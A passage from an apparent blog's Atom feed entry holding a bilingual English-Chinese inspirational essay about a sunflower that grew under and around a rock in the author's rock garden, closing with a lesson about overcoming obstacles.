did the best we could with what we had to work with and called this area our “rock garden.”<br>我们竭尽所能来做我们必须做的工作，并把这个地方叫做我们的“石头花园”。</p><p>Whenever we had leftover flowers or plants, Denise or I would stick them out front, just to bring some color to the area.<br>每当我们有多余的花或者植物时，丹尼斯或者我都会把它们插到前院，只是为了给这一片区域增添一些色彩。</p><p>We would do all of the yard work on our own, even the tiring weed pulling．<br>所有的庭院杂事都收我们自己在做，即使是累人的除草工作。</p><p>Last summer I reached the end of the rock garden and found a tiny little plant that I could not immediately identify．<br>去年夏天，我在石头花园的尽头发现了一株小小的植物，我不能一下子辨认出是什么。</p><p>I knew I didn’t plant it and Denise claimed that she didn’t either．<br>我知道不是我自己种的，丹尼斯说也不是她种的。</p><p>We decided to let it continue growing until we could figure out what it was．<br>我们决定让它继续生长，直到我们可以弄清楚它到底是什么。</p><p>Weeks passed and as I made my way back to the mystery plant, it appeared to be a sunflower with a tall skinny stalk and only one head on it．<br>几周过去了，当我回到那株神秘植物所在之地时，它长成了一株向日葵，其茎干又高又瘦，且只有一个叶球。</p><p>I decided to baby it and weed around it．<br>我决定要呵护它，帮它除草。</p><p>As I pulled rocks from the area to get to the weeds, I noticed something unusual．<br>当我把这个地方的石头挪开以便除草时，我发现有些异常情况。</p><p>The sunflower had not started where I saw the stalk begin．<br>向日葵并不是从我发现茎杆的地方开始生长的。</p><p>It actually had begun under a big rock and grown under and around it to reach the sun．<br>它实际上是从一个大石块下面长出来的，从底部绕开石块努力接触阳光。</p><p><img src="/img/sunflower.jpg"></p><p>That’s when I realized that if a tiny little sunflower didn’t let a big rock stand in its way of developing, we too have the ability to do the same thing.<br>就在这时，我意识到，如果一株小小的向日葵都没有让巨石阻挡它成长的道路，我们同样也能做到。</p><p>Once our environment begins to see that we believe in ourselves like that little sunflower, we can attain the same nourishment and growth as well．<br>一旦周围的环境开始意识到我们对自己充满信心，正如那小小的向日葵一般，我们也可以获得同样的养分，不断成长。</p><p>Stand tall like the sunflower and be proud of who and what you are and the environment will begin to support you．<br>如向日葵般高高站立，为自己是谁、是什么样的人而感到骄傲，环境就会给予你支持。</p><p>You will find a way to go under or around your big obstacle in order to reach your desires．<br>为了达成愿望，你终会找到方法，让自己从底部绕开巨大的障碍生长。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Stand-Tall-Like-The-Sunflower&quot;&gt;&lt;a href=&quot;#Stand-Tall-Like-The-Sunflower&quot; class=&quot;headerlink&quot; title=&quot;Stand Tall Like The Sunflower&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="哲学、文学与艺术" scheme="https://touristdaughter.cyou/categories/%E5%93%B2%E5%AD%A6%E3%80%81%E6%96%87%E5%AD%A6%E4%B8%8E%E8%89%BA%E6%9C%AF/"/>
    
    
  </entry>
  
</feed>
